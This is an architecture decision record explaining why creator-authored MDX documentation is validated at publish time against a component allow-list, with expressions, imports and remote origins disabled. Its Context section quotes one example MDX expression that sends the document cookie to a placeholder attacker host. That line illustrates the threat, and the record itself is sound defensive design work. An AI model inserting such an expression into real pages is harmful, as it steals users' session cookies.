# 0017 — Creator content is untrusted

**Status:** Accepted
**Date:** 2026-10-04

## Context

An experience's documentation is authored on a creator's machine and compiled into
what a user's browser renders. That makes it untrusted content arriving from
outside our trust boundary — the same category as a request body, and in the case
of MDX, a more dangerous one.

MDX is a deliberate choice. A creator wants to write prose *and* embed interactive
components: a command block, a parameterised task, a callout, a worked example.
Plain Markdown cannot do that, and pure JSX cannot express prose comfortably. MDX
sits between them, and its defining feature is that it is a **programming
language**: it permits `import`, `export`, arbitrary JSX, and JavaScript
expressions inside braces.

The safe-looking implementation is to render MDX at read time with a permissive
component map. It is also the one that turns documentation into remote code
execution on our origin, with our session cookie in scope. `{globalThis.fetch(
  'https://attacker/'+document.cookie)}` is a valid expression in MDX.

A second, quieter version of the same mistake: fetching a creator's remote images
and scripts at render time, which leaks the user's IP and viewing behaviour to
the creator and lets the creator serve script to our users after publication.

The core problem is *when* validation happens. Validating at read time means the
malicious document is already on its way to a browser.

## Decision

**Documentation is parsed and validated at publish time against an explicit
component allow-list. There is no path from a document to `eval`, and no
unsupported MDX feature is enabled at render time.**

- MDX is **parsed and validated at publish time**, not rendered as-is at read time.
  A document that fails validation is **never published**.
- **Only components on an explicit allow-list may appear.** An unknown component
  name is a validation error, not a passthrough.
- **Creator `import`, `export`, expressions, `{/* */}` evaluation, and arbitrary
  JSX are not supported.** The MDX feature set is reduced to prose, headings, code,
  and allow-listed components with typed string/number props.
- **No remote origin is reachable from a document** without a publish-time
  allow-list check on the exact origin.
- Rich command output is escaped. An ANSI sequence is a colour and
  control-character filter — never `innerHTML`.
- Publish-time validation is covered by golden-file tests: each fixture parses to
  an expected model, and each rejected fixture is rejected for a named reason.

## Consequences

### Positive

- A creator cannot execute code in a user's session. The attack surface is
  reduced to "does an allow-listed component have a bug", which is a category we
  own and can review.
- Validation happens before publication, so a bad document never reaches a user
  and never needs to be un-published in a hurry.
- Golden-file tests make the allow-list observable: adding a component is a
  visible diff in both the list and the tests.
- Rendering becomes cheap and total: at read time a document is already a
  validated document model, not a program.

### Negative

- Creators cannot write arbitrary JSX. Someone who wants a bespoke visualisation
  cannot have it today, and the answer is "propose a component", not "inline it".
- Publish-time validation adds a pipeline step and a failure mode that must be
  surfaced clearly to the creator, or they will not know why their document was
  rejected.
- The allow-list must be maintained. It will grow slowly and deliberately.
- Remote images need an origin allow-list, which is friction for creators with
  assets on a CDN they do not control.

### Neutral

- The feature set is a subset of MDX. That is the point.

## Alternatives considered

**Render MDX at read time with an explicit component map.** Rejected: the map stops
JSX expressions but leaves the MDX runtime evaluating code in our origin. A
component map is not a security boundary against a language that evaluates.

**Use a hardened MDX provider with expression evaluation disabled via a config
flag.** Rejected: it depends on an option staying off across upgrades of a
third-party compiler, which is a weaker guarantee than not using the feature at
all. "Not enabled" beats "configured off".

**Sandbox documents in a separate origin or an iframe.** Rejected: it treats the
symptom with substantial complexity and still runs creator code, just further away.
It becomes an option later for an explicitly-marked "interactive sandbox" document
type, which would need its own ADR.

**Sanitise rendered HTML after the fact.** Rejected: sanitiser bypasses are a long
history of small differences, and it requires having run the untrusted code first.

**Trust creators.** Rejected: publishing is self-service by design, and "our
creators are vetted" is not a control. One compromised account would reach every
user of every experience.

## References

- [`../../AGENTS.md`](../../AGENTS.md) §4.9 — creator content is untrusted
- [`../../AGENTS.md`](../../AGENTS.md) §7 — security rules
- [`0016-three-versioned-schemas.md`](./0016-three-versioned-schemas.md)
- [`../threat-model.md`](../threat-model.md)
